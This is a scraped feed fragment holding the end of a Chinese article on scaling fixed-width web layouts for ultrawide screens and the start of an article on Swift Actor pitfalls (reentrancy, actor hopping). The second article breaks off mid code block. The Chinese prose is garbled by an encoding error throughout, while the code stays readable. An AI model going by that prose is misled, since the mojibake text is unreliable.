      <span class="hljs-keyword">let</span> indexObj = { <span class="hljs-number">0</span>: <span class="hljs-string">'NAV1'</span>, <span class="hljs-number">1</span>: <span class="hljs-string">'NAV2'</span> }
      <span class="hljs-title function_">hederChangeNav</span>(indexObj[<span class="hljs-variable language_">this</span>.<span class="hljs-property">activeIndex</span>]);
    },
  },
})

<span class="hljs-keyword">function</span> <span class="hljs-title function_">hederChangeNav</span> (val) {
  $(<span class="hljs-string">'.header .nav_item'</span>).<span class="hljs-title function_">removeClass</span>(<span class="hljs-string">'active'</span>);
  $(<span class="hljs-string">'.header .nav_item.'</span> + val).<span class="hljs-title function_">addClass</span>(<span class="hljs-string">'active'</span>);
  mySwiper.<span class="hljs-title function_">slideTo</span>(val === <span class="hljs-string">'NAV1'</span> ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>);
}
</code></pre>
<h2 data-id="heading-7">ä¸åŒå±å¹•å•¥æ•ˆæœ</h2>
<p>å®æµ‹äº†å‡ ç§å±å¹•ï¼š</p>





















<table><thead><tr><th>å±å¹•ç±»å‹</th><th>æ•ˆæœ</th></tr></thead><tbody><tr><td>16:9 æ™®é€šå±</td><td>æ˜¾ç¤º 1920 æ ¸å¿ƒåŒºåŸŸï¼Œ2500 ä¸¤è¾¹è¢«è£æ‰ï¼Œæ­£å¸¸ä½¿ç”¨</td></tr><tr><td>21:9 å¸¦é±¼å±</td><td>2500 åŒºåŸŸå®Œæ•´æ˜¾ç¤ºï¼Œä¸¤è¾¹çš„è£…é¥°å…ƒç´ éƒ½èƒ½çœ‹åˆ°</td></tr><tr><td>32:9 è¶…å®½å±</td><td>ä¸Šä¸‹ä¼šæœ‰é»‘è¾¹ï¼Œå› ä¸ºé«˜åº¦å…ˆè¾¾åˆ°ç¼©æ”¾ä¸Šé™</td></tr></tbody></table>
<p>32:9 çš„é»‘è¾¹å…¶å®ä¹Ÿèƒ½æ¥å—ï¼Œæ¯•ç«Ÿé‚£ç§å±å¹•æœ¬æ¥å°±å°‘ã€‚çœŸè¦é€‚é…å¯ä»¥å†å¥—ä¸€å±‚æ›´å®½çš„å®¹å™¨ï¼Œä½†æ„Ÿè§‰æ²¡å¿…è¦ã€‚</p>
<h2 data-id="heading-8">è¸©çš„å‘</h2>
<h3 data-id="heading-9">1. fixed å®šä½ä¸è·Ÿç€ç¼©æ”¾</h3>
<p>å¯¼èˆªæ ç”¨çš„ fixed å®šä½ï¼Œç»“æœå‘ç°å®ƒä¸å—çˆ¶å®¹å™¨ scale å½±å“ã€‚</p>
<p>ä¸€å¼€å§‹æƒ³ç€æŠŠå¯¼èˆªä¹Ÿæ”¾ scale å®¹å™¨é‡Œï¼Œä½†é‚£æ ·æ»šåŠ¨çš„æ—¶å€™å¯¼èˆªä¼šè·Ÿç€åŠ¨ã€‚æœ€åè¿˜æ˜¯å•ç‹¬å¤„ç†äº†ï¼Œå¯¼èˆªæ å®½åº¦å†™æ­»ï¼Œä½ç½®ç”¨ç™¾åˆ†æ¯”é€‚é…ã€‚</p>
<h3 data-id="heading-10">2. CSS min() å…¼å®¹æ€§</h3>
<p><code>min()</code> å‡½æ•°ä¸æ”¯æŒ IEï¼Œè€ç‰ˆæœ¬ Safari ä¹Ÿæœ‰é—®é¢˜ã€‚</p>
<p>å¦‚æœè¦å…¼å®¹è€æµè§ˆå™¨ï¼Œå¾—ç”¨ JS ç®—ç¼©æ”¾æ¯”ä¾‹ï¼Œç›‘å¬ resize äº‹ä»¶åŠ¨æ€è®¾ç½®ã€‚å¤§æ¦‚è¿™æ ·ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">updateScale</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> s = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span> / <span class="hljs-number">1920</span>,
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span> / <span class="hljs-number">1080</span>
  );
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'container_2500'</span>).<span class="hljs-property">style</span>.<span class="hljs-property">transform</span> = 
    <span class="hljs-string">`translate(-50%, -50%) scale(<span class="hljs-subst">${s}</span>)`</span>;
}
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, updateScale);
<span class="hljs-title function_">updateScale</span>();
</code></pre>
<p>ä¸è¿‡ç°åœ¨é¡¹ç›®ä¸ç”¨ç®¡ IE äº†ï¼Œç›´æ¥ CSS æå®šã€‚</p>
<h3 data-id="heading-11">3. å­—ä½“æ¨¡ç³Š</h3>
<p>scale ç¼©æ”¾å¯èƒ½å¯¼è‡´å­—ä½“æ¨¡ç³Šï¼Œç‰¹åˆ«æ˜¯ç¼©æ”¾æ¯”ä¾‹ä¸æ˜¯æ•´æ•°çš„æ—¶å€™ã€‚</p>
<p>æ²¡æ‰¾åˆ°å®Œç¾æ–¹æ¡ˆï¼ŒåŠ äº†ä¸ª <code>transform-origin: center</code> ç¨å¾®å¥½ç‚¹ã€‚å¦‚æœçœŸçš„å¾ˆåœ¨æ„ï¼Œå¯èƒ½å¾—ç”¨åˆ«çš„æ–¹æ¡ˆäº†ã€‚</p>
<h2 data-id="heading-12">æ–‡ä»¶æ€ä¹ˆæ”¾</h2>
<p>å®é™…é¡¹ç›®é‡Œæˆ‘æ˜¯è¿™ä¹ˆç»„ç»‡å†…å®¹çš„ï¼š</p>
<ul>
<li>ä¸»è¦å†…å®¹ã€äº¤äº’å…ƒç´  â†’ æ”¾ <code>.box_1920</code> é‡Œï¼Œç¡®ä¿æ™®é€šå±å¹•ä¹Ÿèƒ½æ­£å¸¸ç”¨</li>
<li>è£…é¥°æ€§èƒŒæ™¯ã€æ‰©å±•è§†è§‰å…ƒç´  â†’ æ”¾ <code>#container_2500</code> é‡Œï¼Œå¸¦é±¼å±ç”¨æˆ·èƒ½çœ‹åˆ°æ›´å¤š</li>
</ul>
<p>æ¯”å¦‚é¦–å±èƒŒæ™¯å›¾å¯ä»¥ç”¨ 2500 å®½çš„ï¼Œä¸¤è¾¹æ˜¯å»¶ä¼¸çš„è£…é¥°ï¼Œä¸­é—´ 1920 æ˜¯ä¸»ä½“ã€‚æ™®é€šå±ç”¨æˆ·çœ‹åˆ°çš„å°±æ˜¯ 1920 çš„éƒ¨åˆ†ï¼Œå¸¦é±¼å±ç”¨æˆ·èƒ½çœ‹åˆ°å®Œæ•´çš„ 2500ã€‚</p>
<h2 data-id="heading-13">è¿™æ–¹æ¡ˆé€‚åˆä»€ä¹ˆåœºæ™¯</h2>
<p>é€‚åˆï¼š</p>
<ul>
<li>å®˜ç½‘ã€è½åœ°é¡µè¿™ç§å±•ç¤ºå‹é¡µé¢</li>
<li>è®¾è®¡ç¨¿æ˜¯å›ºå®šå°ºå¯¸çš„</li>
<li>ä¸éœ€è¦è€ƒè™‘ç§»åŠ¨ç«¯ï¼ˆç§»åŠ¨ç«¯å¦å¤–å†™ä¸€å¥—ï¼‰</li>
<li>ä¸ç”¨æ”¯æŒ IE</li>
</ul>
<p>ä¸é€‚åˆï¼š</p>
<ul>
<li>å†…å®¹å‹ç½‘ç«™ï¼Œæ¯”å¦‚åšå®¢ã€æ–‡æ¡£ç«™</li>
<li>éœ€è¦å“åº”å¼å¸ƒå±€çš„</li>
<li>å¯¹æ–‡å­—æ¸…æ™°åº¦è¦æ±‚æé«˜çš„</li>
</ul>
<hr/>
<p>è¿™ä¸ªæ–¹æ¡ˆè¯´ç™½äº†å°±æ˜¯"è®¾è®¡ç¨¿å¤šå¤§å°±åšå¤šå¤§ï¼Œç„¶åæ•´ä½“ç¼©æ”¾"ã€‚ä¼˜ç‚¹æ˜¯ç®€å•ï¼Œè®¾è®¡ç¨¿æ˜¯å•¥æ ·ï¼Œé¡µé¢å°±æ˜¯å•¥æ ·ï¼Œä¸ç”¨è€ƒè™‘å“åº”å¼å¸ƒå±€ï¼Œä¸ç”¨ç®—ç™¾åˆ†æ¯”ï¼Œæ‰€æœ‰å°ºå¯¸ç›´æ¥å†™ pxã€‚ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œåªé€‚åˆå±•ç¤ºå‹é¡µé¢ï¼Œå†…å®¹å‹ç½‘ç«™åˆ«ç”¨è¿™ä¸ªï¼Œæ–‡ç« é¡µé¢ç¼©æ¥ç¼©å»ä½“éªŒå¾ˆå·®ã€‚å…¶å®æˆ‘ä¸€ç›´è§‰å¾—è¿™æ–¹æ¡ˆæœ‰ç‚¹"ä½œå¼Š"çš„æ„Ÿè§‰ï¼Œä¸å¤Ÿä¼˜é›…ã€‚ä½†èƒ½ç”¨ã€å¥½ç»´æŠ¤ã€ä¸Šçº¿å¿«ï¼Œæœ‰æ—¶å€™è¿™å°±å¤Ÿäº†ã€‚æ¯•ç«Ÿä»£ç æ˜¯å†™ç»™äººçœ‹çš„ï¼Œä¹Ÿæ˜¯å†™ç»™ deadline çœ‹çš„ã€‚</p>
<p>ä»£ç æˆ‘æ”¾åœ¨githubäº†ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxxhe1024%2Fultrawide-scale-fit" target="_blank" title="https://github.com/xxhe1024/ultrawide-scale-fit" ref="nofollow noopener noreferrer">github.com/xxhe1024/ulâ€¦</a></p>
<p>æœ‰æ›´å¥½çš„æ–¹æ¡ˆæ¬¢è¿è¯„è®ºåŒºäº¤æµã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥å‰–æ Swift Actorsï¼šå…­å¤§é™·é˜±ä¸é¿å‘æŒ‡å—]]></title>    <link>https://juejin.cn/post/7603010441149939753</link>    <guid>https://juejin.cn/post/7603010441149939753</guid>    <pubDate>2026-02-05T10:25:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603010441149939753" data-draft-id="7603219519666339859" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥å‰–æ Swift Actorsï¼šå…­å¤§é™·é˜±ä¸é¿å‘æŒ‡å—"/> <meta itemprop="keywords" content="Swift"/> <meta itemprop="datePublished" content="2026-02-05T10:25:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="unravel2025"/> <meta itemprop="url" content="https://juejin.cn/user/1116759541421880"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥å‰–æ Swift Actorsï¼šå…­å¤§é™·é˜±ä¸é¿å‘æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1116759541421880/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    unravel2025
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:25:15.000Z" title="Thu Feb 05 2026 10:25:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>åŸæ–‡å­¦ä¹ è‡ªï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.fractal-dev.com%2Fblog%2Fswift-actors-pitfalls" target="_blank" title="https://www.fractal-dev.com/blog/swift-actors-pitfalls" ref="nofollow noopener noreferrer">www.fractal-dev.com/blog/swift-â€¦</a></p>
</blockquote>
<p>Swift 5.5 å¼•å…¥ Actors æ—¶ï¼Œè‹¹æœæ‰¿è¯ºè¿™å°†ç»ˆç»“æ•°æ®ç«äº‰é—®é¢˜ã€‚"åªéœ€æŠŠ class æ¢æˆ actorï¼Œé—®é¢˜å°±è§£å†³äº†"â€”â€”ä½†äº‹å®è¿œæ¯”è¿™å¤æ‚ã€‚</p>
<h2 data-id="heading-0">é™·é˜± 1ï¼šReentrancyï¼ˆé‡å…¥ï¼‰â€”â€”Actor ä¸æ˜¯ä¸²è¡Œé˜Ÿåˆ—</h2>
<p>è¿™æ˜¯æœ€è¢«ä½ä¼°çš„é™·é˜±ã€‚å¤§å¤šæ•°å¼€å‘è€…è®¤ä¸º Actor å°±åƒå†…ç½®äº† <code>DispatchQueue(label: "serial")</code> ä¸²è¡Œé˜Ÿåˆ—çš„ç±»ã€‚å®é™…ä¸Šå¹¶ä¸æ˜¯ï¼Œè¿™æ˜¯ä¸ªè‡´å‘½è¯¯è§£ã€‚</p>
<p>Actor åªä¿è¯ä¸€ç‚¹ï¼šåŒä¸€æ—¶åˆ»åªæ‰§è¡Œä¸€ä¸ªä»£ç ç‰‡æ®µã€‚ ä½†åœ¨ <code>await</code> ä¹‹é—´ï¼Œå®ƒå¯èƒ½å¤„ç†å®Œå…¨ä¸åŒçš„è°ƒç”¨ã€‚</p>
<p>åŸç†åˆ†æ</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">actor</span> <span class="hljs-title class_">BankAccount</span> {
    <span class="hljs-keyword">var</span> balance: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">withdraw</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">amount</span>: <span class="hljs-type">Int</span>) <span class="hljs-keyword">async</span> -&gt; <span class="hljs-type">Bool</span> {
        <span class="hljs-comment">// æ£€æŸ¥ä½™é¢</span>
        <span class="hljs-keyword">guard</span> balance <span class="hljs-operator">&gt;=</span> amount <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> }

        <span class="hljs-comment">// âš ï¸ æŒ‚èµ·ç‚¹ - åœ¨æ­¤å¤„ Actor å¯ä»¥å¤„ç†å…¶ä»–è°ƒç”¨</span>
        <span class="hljs-keyword">await</span> authorizeTransaction()

        <span class="hljs-comment">// è¿”å›åä½™é¢å¯èƒ½å·²ç»æ”¹å˜ï¼</span>
        balance <span class="hljs-operator">-=</span> amount  <span class="hljs-comment">// å¯èƒ½å˜æˆè´Ÿæ•°ï¼</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">authorizeTransaction</span>() <span class="hljs-keyword">async</span> {
        <span class="hljs-keyword">try?</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(for: .milliseconds(<span class="hljs-number">100</span>))
    }
}

<span class="hljs-keyword">let</span> <span class="hljs-keyword">actor</span> = <span class="hljs-title class_">BankAccount</span>()
<span class="hljs-title class_">Task</span>.<span class="hljs-title class_">detached</span> {
    <span class="hljs-keyword">await</span> <span class="hljs-keyword">actor</span>.withdraw(<span class="hljs-number">800</span>)
}
<span class="hljs-type">Task</span>.detached {
    <span class="hljs-keyword">await</span> <span class="hljs-keyword">actor</span>.withdraw(<span class="hljs-number">800</span>)
}

<span class="hljs-type">Task</span>.detached {
    <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(nanoseconds: <span class="hljs-number">200</span> <span class="hljs-operator">*</span> <span class="hljs-number">1000_000</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-keyword">await</span> <span class="hljs-keyword">actor</span>.balance)
}
</code></pre>
<p>æ‰§è¡Œæ—¶åºé—®é¢˜ï¼š</p>
<p>å¦‚æœä¸¤ä¸ªä»»åŠ¡å‡ ä¹åŒæ—¶è°ƒç”¨ <code>withdraw(800)</code>ï¼š</p>
<ol>
<li>ä»»åŠ¡ Aï¼šæ£€æŸ¥ <code>balance &gt;= 800</code> â†’ true</li>
<li>ä»»åŠ¡ Aï¼šç­‰å¾… <code>authorizeTransaction()</code></li>
<li>ä»»åŠ¡ Bï¼šè¿›å…¥ Actorï¼Œæ£€æŸ¥ <code>balance &gt;= 800</code> â†’ trueï¼ˆä»ç„¶æ˜¯1000ï¼ï¼‰</li>
<li>ä»»åŠ¡ Bï¼šç­‰å¾… <code>authorizeTransaction()</code></li>
<li>ä»»åŠ¡ Aï¼šè¿”å›ï¼Œæ‰£æ¬¾800 â†’ balance = 200</li>
<li>ä»»åŠ¡ Bï¼šè¿”å›ï¼Œæ‰£æ¬¾800 â†’ balance = -600 ğŸ’¥</li>
</ol>
<p>ä¸ºä»€ä¹ˆä¼šè¿™æ ·è®¾è®¡ï¼Ÿ</p>
<p>Apple æ•…æ„é€‰æ‹©é‡å…¥è®¾è®¡æ¥é¿å…æ­»é”ã€‚å¦‚æœä¸¤ä¸ª Actor äº’ç›¸ç­‰å¾…å¯¹æ–¹â€”â€”æ²¡æœ‰é‡å…¥å°±æ˜¯ç»å…¸æ­»é”ã€‚æœ‰äº†é‡å…¥ï¼Œä½ å¾—åˆ°çš„æ˜¯â€¦â€¦å¾®å¦™çš„çŠ¶æ€ Bugã€‚</p>
<p>è§£å†³æ–¹æ¡ˆï¼šTask Cache æ¨¡å¼</p>
<p>æ ¸å¿ƒæ€æƒ³ï¼šåœ¨ç¬¬ä¸€ä¸ªæŒ‚èµ·ç‚¹ä¹‹å‰åŒæ­¥ä¿®æ”¹çŠ¶æ€ã€‚</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">actor</span> <span class="hljs-title class_">BankAccount</span> {
    <span class="hljs-keyword">var</span> balance: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>
    <span class="hljs-comment">// å­˜å‚¨æ­£åœ¨å¤„ç†çš„äº¤æ˜“ä»»åŠ¡</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> pendingWithdrawals: [<span class="hljs-type">UUID</span>: <span class="hljs-type">Task</span>&lt;<span class="hljs-type">Bool</span>, <span class="hljs-type">Never</span>&gt;] <span class="hljs-operator">=</span> [:]

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">withdraw</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">amount</span>: <span class="hljs-type">Int</span>, <span class="hljs-params">id</span>: <span class="hljs-type">UUID</span> <span class="hljs-operator">=</span> <span class="hljs-type">UUID</span>()) <span class="hljs-keyword">async</span> -&gt; <span class="hljs-type">Bool</span> {
        <span class="hljs-comment">// å¦‚æœå·²ç»åœ¨å¤„ç†è¿™ç¬”äº¤æ˜“ï¼Œç­‰å¾…ç»“æœ</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> existing <span class="hljs-operator">=</span> pendingWithdrawals[id] {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> existing.value
        }

        <span class="hljs-comment">// åœ¨ä»»ä½• await ä¹‹å‰åŒæ­¥æ£€æŸ¥ä½™é¢</span>
        <span class="hljs-keyword">guard</span> balance <span class="hljs-operator">&gt;=</span> amount <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> }

        <span class="hljs-comment">// åŒæ­¥é¢„ç•™èµ„é‡‘</span>
        balance <span class="hljs-operator">-=</span> amount

        <span class="hljs-comment">// åˆ›å»ºæˆæƒä»»åŠ¡</span>
        <span class="hljs-keyword">let</span> task <span class="hljs-operator">=</span> <span class="hljs-type">Task</span> {
            <span class="hljs-keyword">await</span> authorizeTransaction()
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
        }
        pendingWithdrawals[id] <span class="hljs-operator">=</span> task

        <span class="hljs-keyword">let</span> result <span class="hljs-operator">=</span> <span class="hljs-keyword">await</span> task.value
        pendingWithdrawals[id] <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>

        <span class="hljs-comment">// å¦‚æœæˆæƒå¤±è´¥ï¼Œå›æ»š</span>
        <span class="hljs-keyword">if</span> <span class="hljs-operator">!</span>result {
            balance <span class="hljs-operator">+=</span> amount
        }
        <span class="hljs-keyword">return</span> result
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">authorizeTransaction</span>() <span class="hljs-keyword">async</span> {
        <span class="hljs-keyword">try?</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(for: .milliseconds(<span class="hljs-number">100</span>))
    }
}
</code></pre>
<p>å…³é”®æ”¹å˜ï¼šçŠ¶æ€å˜æ›´å‘ç”Ÿåœ¨åŒæ­¥ä»£ç å—ä¸­ï¼Œåœ¨ä»»ä½• <code>await</code> ä¹‹å‰ã€‚</p>
<blockquote>
<p>æ³¨æ„ï¼šè¿™åªæ˜¯è§£å†³é‡å…¥é—®é¢˜çš„æ¨¡å¼ä¹‹ä¸€ï¼Œå¹¶éå”¯ä¸€æˆ–æ€»æ˜¯æœ€ä½³æ–¹æ¡ˆã€‚å…¶ä»–æ›¿ä»£æ–¹æ¡ˆåŒ…æ‹¬ï¼šActor + çº¯å¼‚æ­¥æœåŠ¡æ‹†åˆ†ã€ä¹è§‚é”ï¼ˆoptimistic lockingï¼‰ï¼Œæˆ–åœ¨ç‰¹å®šæƒ…å†µä¸‹ä½¿ç”¨ <code>nonisolated</code> + é”ã€‚é€‰æ‹©å–å†³äºå…·ä½“ç”¨ä¾‹ã€‚</p>
</blockquote>
<h2 data-id="heading-1">é™·é˜± 2ï¼šActor Hoppingâ€”â€”æ€§èƒ½æ€æ‰‹</h2>
<p>æ¯æ¬¡è·¨è¶Š Actor è¾¹ç•Œéƒ½æ˜¯ä¸€æ¬¡æ½œåœ¨çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚åœ¨å¾ªç¯ä¸­è¿™å¯èƒ½æ˜¯ç¾éš¾ã€‚</p>
<p>æ€§èƒ½é—®é¢˜</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">actor</span> <span class="hljs-title class_">Database</span> {
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">loadUser</span>(<span class="hljs-params">id</span>: <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">User</span> {
        <span class="hljs-comment">// è€—æ—¶æ“ä½œ</span>
        <span class="hljs-type">User</span>(id: id)
    }
}

<span class="hljs-meta">@MainActor</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DataModel</span> {
    <span class="hljs-keyword">let</span> database <span class="hljs-operator">=</span> <span class="hljs-type">Database</span>()
    <span class="hljs-keyword">var</span> users: [<span class="hljs-type">User</span>] <span class="hljs-operator">=</span> []

    <span class="hljs-keyword">func</span> <span class="hljs-title function_">loadUsers</span>() <span class="hljs-keyword">async</span> {
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">1</span><span class="hljs-operator">...</span><span class="hljs-number">100</span> {
            <span class="hljs-comment">// âŒ 200 æ¬¡ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼</span>
            <span class="hljs-keyword">let</span> user <span class="hljs-operator">=</span> <span class="hljs-keyword">await</span> database.loadUser(id: i)
            users.append(user)
        }
    }
}
</code></pre>
<p>æ¯æ¬¡è¿­ä»£ï¼š</p>
<ol>
<li>ä» MainActor è·³è½¬åˆ° Database Actor</li>
<li>ä» Database Actor è·³å› MainActor</li>
</ol>
<p>100 æ¬¡è¿­ä»£ = 200 æ¬¡è·³è½¬ã€‚è‹¹æœåœ¨ WWDC 2021 "Swift Concurrency: Behind the Scenes" ä¸­å±•ç¤ºäº†è¿™åœ¨ CPU ä¸Šçš„æ¨¡å¼â€”â€”åƒ"é”¯é½¿"ä¸€æ ·æŒç»­ä¸­æ–­ã€‚</p>
<p>è§£å†³æ–¹æ¡ˆï¼šæ‰¹å¤„ç†ï¼ˆBatchingï¼‰</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">actor</span> <span class="hljs-title class_">Database</span> {
